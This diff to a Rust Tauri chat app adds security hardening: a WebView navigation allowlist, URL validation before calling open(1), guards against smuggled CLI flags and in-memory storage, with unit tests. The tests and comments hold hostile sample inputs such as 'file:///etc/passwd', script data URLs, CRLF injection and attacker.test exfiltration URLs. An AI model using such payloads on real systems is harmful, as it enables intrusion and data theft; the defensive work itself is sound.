@@ -4,12 +4,50 @@ use std::sync::Mutex;
 use tauri::{
     menu::{Menu, MenuBuilder, MenuItem, PredefinedMenuItem, SubmenuBuilder},
     tray::TrayIconBuilder,
-    Emitter, Manager, WebviewUrl, WebviewWindowBuilder,
+    webview::NewWindowResponse,
+    Emitter, Manager, Url, WebviewUrl, WebviewWindowBuilder,
 };
 use tauri_plugin_global_shortcut::{GlobalShortcutExt, Shortcut, ShortcutState};
 
 mod chat;
+mod cleanup;
 mod settings;
+
+/// Decide whether a WebView is allowed to navigate to `url`.
+///
+/// The chat WebView renders model output, which (despite sanitization
+/// + CSP) is the most likely source of a future XSS bug. CSP doesn't
+/// have a portable directive that blocks top-level navigation, so a
+/// payload like `window.location = "https://attacker.test/"` would
+/// otherwise replace the chat UI with an attacker-controlled page
+/// served from an attacker origin — that origin's CSP (or lack
+/// thereof) then governs further behavior, defeating our hardening.
+///
+/// This handler refuses every URL that doesn't point at our own
+/// content:
+///   - `about:` (covers about:blank used during initial load)
+///   - `http` / `https` / `tauri` schemes, restricted to localhost,
+///     127.0.0.1, or tauri.localhost (the production custom URL).
+///
+/// Pure function; tested in the `tests` submodule.
+pub(crate) fn is_allowed_navigation(url: &Url) -> bool {
+    let scheme = url.scheme();
+    if scheme == "about" {
+        return true;
+    }
+    if !matches!(scheme, "http" | "https" | "tauri") {
+        return false;
+    }
+    // The URL parser only canonicalizes host to lowercase for "special"
+    // schemes (http/https etc.); non-special schemes like `tauri://`
+    // preserve case. Lowercase ourselves so a mixed-case localhost
+    // variant doesn't bypass the allowlist.
+    let host = url.host_str().unwrap_or("").to_ascii_lowercase();
+    matches!(
+        host.as_str(),
+        "localhost" | "127.0.0.1" | "tauri.localhost",
+    )
+}
 
 pub struct AppState {
     sessions: Mutex<HashMap<String, chat::ChatSession>>,
@@ -70,9 +108,21 @@ fn update_settings(
     state: tauri::State<'_, AppState>,
     new_settings: settings::Settings,
 ) -> Result<(), String> {
+    // Canonicalize model/effort BEFORE doing anything else. If a
+    // malicious caller reaches this command via the IPC (e.g. through
+    // a sanitizer bypass in the chat WebView), they could otherwise
+    // smuggle a CLI flag like `--allowedTools Bash` as the "model"
+    // field and have it land in `claude`'s argv on the next chat
+    // session. canonicalize_* falls back to defaults for anything
+    // outside the safe-format / known-value sets.
+    let mut new_settings = new_settings;
+    new_settings.model = settings::canonicalize_model(&new_settings.model);
+    new_settings.effort = settings::canonicalize_effort(&new_settings.effort);
+
     // Validate new shortcut before committing
     let new_shortcut = new_settings.to_shortcut().ok_or_else(|| {
-        "invalid hotkey: at least one modifier and a valid key are required".to_string()
+        "invalid hotkey: at least one non-shift modifier (⌘ / ⌥ / ⌃) and a valid key are required"
+            .to_string()
     })?;
 
     // Re-register the hotkey only if it actually changed. Otherwise calling
@@ -104,9 +154,6 @@ fn update_settings(
     // Save settings
     *state.settings.lock().map_err(|e| e.to_string())? = new_settings.clone();
     settings::save(&app, &new_settings).map_err(|e| e.to_string())?;
-
-    // Notify all windows that settings have changed
-    let _ = app.emit("settings-updated", &new_settings);
     Ok(())
 }
 
@@ -118,6 +165,11 @@ fn restart_session(
     model: String,
     effort: String,
 ) -> Result<(), String> {
+    // Same flag-injection defense as in update_settings — never trust
+    // model/effort strings that arrived via the IPC verbatim.
+    let model = settings::canonicalize_model(&model);
+    let effort = settings::canonicalize_effort(&effort);
+
     let label = window.label().to_string();
     {
         // drop the old session
@@ -133,6 +185,234 @@ fn restart_session(
         .map_err(|e| e.to_string())?
         .insert(label, new_session);
     Ok(())
+}
+
+/// Scheme/length allowlist for URLs the chat WebView is allowed to
+/// hand off to `open(1)`. Pure function so it can be unit-tested
+/// without spawning processes.
+///
+/// The allowlist sits HERE rather than in the renderer because this is
+/// the choke point a compromised renderer (think: sanitizer bypass)
+/// would have to reach to launch anything. We refuse `file:`,
+/// `javascript:`, custom-protocol handlers, and anything else outside
+/// the small set a chat reply could legitimately link to.
+pub(crate) fn validate_external_url(url: &str) -> Result<(), &'static str> {
+    let allowed = url.starts_with("https://")
+        || url.starts_with("http://")
+        || url.starts_with("mailto:")
+        || url.starts_with("tel:");
+    if !allowed {
+        return Err("url scheme not allowed");
+    }
+    // 2KB cap — anything longer is almost certainly junk and we don't
+    // want to hand a multi-MB argv to `open`.
+    if url.len() > 2048 {
+        return Err("url too long");
+    }
+    // ASCII control characters (including \n and \r) have no business
+    // appearing in a URL we route through a subprocess.
+    if url.chars().any(|c| c.is_ascii_control()) {
+        return Err("url contains control characters");
+    }
+    Ok(())
+}
+
+/// Open an external URL via macOS's `open(1)` so that link clicks in a
+/// chat reply land in the user's default browser instead of navigating
+/// the WebView away from the chat UI.
+#[tauri::command]
+fn open_external_url(url: String) -> Result<(), String> {
+    validate_external_url(&url).map_err(String::from)?;
+    // No shell — args go straight through execve, so there's no
+    // metacharacter hazard. The leading `--` is a defensive habit for
+    // BSD-style getopt; even without it the scheme allowlist above
+    // already guarantees the URL doesn't start with `-`.
+    std::process::Command::new("/usr/bin/open")
+        .arg("--")
+        .arg(&url)
+        .spawn()
+        .map_err(|e| e.to_string())?;
+    Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn allows_http_https_mailto_tel() {
+        for ok in [
+            "https://www.anthropic.com",
+            "http://example.com/path?q=1",
+            "mailto:hello@example.com",
+            "tel:+1-555-0100",
+        ] {
+            assert!(validate_external_url(ok).is_ok(), "{ok:?} should be allowed");
+        }
+    }
+
+    #[test]
+    fn rejects_dangerous_schemes() {
+        // file: would expose any local file the user has read access to.
+        // javascript: would re-introduce the same XSS-shaped risk we
+        // already block at the sanitizer layer.
+        // data: in particular data:text/html could carry arbitrary
+        // HTML/script via the macOS URL handler chain.
+        // Custom-scheme URLs (e.g. "slack://", "vscode://") could fire
+        // commands in other locally-installed apps.
+        for bad in [
+            "file:///etc/passwd",
+            "javascript:alert(1)",
+            "data:text/html,<script>alert(1)</script>",
+            "ftp://attacker.test/",
+            "ssh://attacker.test/",
+            "slack://channel?id=foo",
+            "vscode://file/etc/passwd",
+            "x-apple.systempreferences:",
+            "",
+            "   ",
+            "https",  // missing scheme separator
+        ] {
+            assert!(
+                validate_external_url(bad).is_err(),
+                "{bad:?} must be rejected",
+            );
+        }
+    }
+
+    #[test]
+    fn rejects_overlong_urls() {
+        let url = format!("https://example.com/{}", "a".repeat(2048));
+        assert!(validate_external_url(&url).is_err());
+    }
+
+    #[test]
+    fn rejects_urls_with_control_chars() {
+        for bad in [
+            "https://example.com/\n",
+            "https://example.com/\r\nHost:evil",
+            "https://example.com/\x00",
+            "https://example.com/\x1b[31m",
+        ] {
+            assert!(
+                validate_external_url(bad).is_err(),
+                "{bad:?} must be rejected (control char)",
+            );
+        }
+    }
+
+    #[test]
+    fn rejects_leading_dash_in_url() {
+        // We never want anything we pass to `open(1)` to look like a
+        // CLI flag. The scheme allowlist already prevents this, but
+        // call it out explicitly so the property doesn't silently break
+        // if someone widens the scheme list later.
+        assert!(validate_external_url("--malicious-flag").is_err());
+    }
+
+    // ─── is_allowed_navigation: top-level WebView navigation ─────
+
+    fn url(s: &str) -> Url {
+        Url::parse(s).expect("test URL should parse")
+    }
+
+    #[test]
+    fn navigation_allows_dev_localhost() {
+        for u in [
+            "http://localhost:1420/",
+            "http://localhost:1420/index.html",
+            "http://localhost:1420/chat.ts?t=123",
+            "http://127.0.0.1:1420/",
+        ] {
+            assert!(
+                is_allowed_navigation(&url(u)),
+                "dev URL must be allowed: {u}",
+            );
+        }
+    }
+
+    #[test]
+    fn navigation_allows_prod_asset_origins() {
+        for u in [
+            "tauri://localhost/index.html",
+            "tauri://localhost/",
+            "https://tauri.localhost/",
+            "https://tauri.localhost/settings.html",
+        ] {
+            assert!(
+                is_allowed_navigation(&url(u)),
+                "prod URL must be allowed: {u}",
+            );
+        }
+    }
+
+    #[test]
+    fn navigation_allows_about_blank() {
+        assert!(is_allowed_navigation(&url("about:blank")));
+    }
+
+    #[test]
+    fn navigation_blocks_external_origins() {
+        // This is the whole point: an XSS payload that did
+        // `window.location = "https://attacker.test/?leak=…"` must
+        // be refused at the WebView layer. CSP doesn't have a portable
+        // navigate-to directive, so this handler is the only thing
+        // standing between a sanitizer bypass and an attacker page
+        // taking over our WebView.
+        for u in [
+            "https://attacker.test/",
+            "https://attacker.test/?leak=secrets",
+            "http://attacker.test/",
+            "https://www.anthropic.com/",
+            "http://192.168.1.1/",
+            "tauri://attacker.test/",
+            // suffix attack: a host that ends in our allowlisted name
+            "https://tauri.localhost.attacker.test/",
+            // prefix attack: a host that starts with our allowlisted name
+            "https://tauri.localhostattacker.test/",
+            // userinfo injection: tauri.localhost as username, attacker as host
+            "https://tauri.localhost@attacker.test/",
+            "https://localhost@attacker.test/",
+        ] {
+            assert!(
+                !is_allowed_navigation(&url(u)),
+                "external URL must be blocked: {u}",
+            );
+        }
+    }
+
+    #[test]
+    fn navigation_is_case_insensitive_for_host() {
+        // The URL parser canonicalizes host to lowercase per RFC, so
+        // mixed-case localhost variants resolve to the same host and
+        // get matched by our allowlist.
+        for u in [
+            "http://LOCALHOST:1420/",
+            "http://Localhost:1420/",
+            "tauri://Tauri.Localhost/",
+            "https://TAURI.LOCALHOST/",
+        ] {
+            assert!(
+                is_allowed_navigation(&url(u)),
+                "case variant must be allowed: {u}",
+            );
+        }
+    }
+
+    #[test]
+    fn navigation_blocks_dangerous_schemes() {
+        for u in [
+            "file:///etc/passwd",
+            "javascript:alert(1)",
+            "data:text/html,<script>alert(1)</script>",
+            "ftp://example.com/",
+        ] {
+            assert!(
+                !is_allowed_navigation(&url(u)),
+                "scheme must be blocked: {u}",
+            );
+        }
+    }
 }
 
 #[tauri::command]
@@ -162,6 +442,15 @@ fn open_settings(app: &tauri::AppHandle) {
     .focused(true)
     .visible(true)
     .always_on_top(false)
+    .on_navigation(is_allowed_navigation)
+    // Explicit refusal of every `window.open()` from JS. macOS WebKit
+    // already blocks popups by default when no handler is set, but
+    // setting Deny pins the contract: a future XSS payload that calls
+    // `window.open("https://attacker.test/", "_blank")` never gets a
+    // popup, and the existing link-click interceptor handles legit
+    // anchor clicks by routing through open_external_url.
+    .on_new_window(|_url, _features| NewWindowResponse::Deny)
+    .incognito(true)
     .build()
     {
         Ok(w) => w,
@@ -335,6 +624,14 @@ fn spawn_chat_window(app: &tauri::AppHandle) {
     .resizable(true)
     .focused(true)
     .visible(true)
+    .on_navigation(is_allowed_navigation)
+    .on_new_window(|_url, _features| NewWindowResponse::Deny)
+    // nonPersistent WKWebsiteDataStore: localStorage, cookies, IndexedDB
+    // and the HTTP cache live in memory only and are wiped when the
+    // window closes. Without this, an XSS payload (or future bug) that
+    // writes to localStorage would persist *across sessions* — the
+    // exact promise this app is named after.
+    .incognito(true)
     .build()
     {
         Ok(w) => w,
@@ -370,10 +667,13 @@ fn spawn_chat_window(app: &tauri::AppHandle) {
             eprintln!("failed to start claude subprocess: {e}");
             let err_msg = e.to_string();
             let app_clone = app.clone();
-            let event_name = format!("session-error-{}", label);
+            let label_for_event = label.clone();
+            // Per-window emit — same anti-spy reasoning as in chat.rs.
             std::thread::spawn(move || {
                 std::thread::sleep(std::time::Duration::from_millis(400));
-                let _ = app_clone.emit(&event_name, err_msg);
+                if let Some(win) = app_clone.get_webview_window(&label_for_event) {
+                    let _ = win.emit("session-error", err_msg);
+                }
             });
             return;
         }
@@ -419,6 +719,13 @@ pub fn run() {
         })
         .plugin(tauri_plugin_global_shortcut::Builder::new().build())
         .setup(|app| {
+            // Belt-and-suspenders for the "nothing persists" promise:
+            // delete any leftover session dirs from prior runs that
+            // crashed / were SIGKILLed before ChatSession::drop got to
+            // run. Recently-touched dirs are skipped in case another
+            // instance of the app is concurrently active.
+            cleanup::sweep_orphans();
+
             #[cfg(target_os = "macos")]
             app.set_activation_policy(tauri::ActivationPolicy::Accessory);
 
@@ -560,6 +867,7 @@ pub fn run() {
             restart_session,
             get_window_session_info,
             open_settings_window,
+            open_external_url,
         ])
         .build(tauri::generate_context!())
         .expect("error while building tauri application")
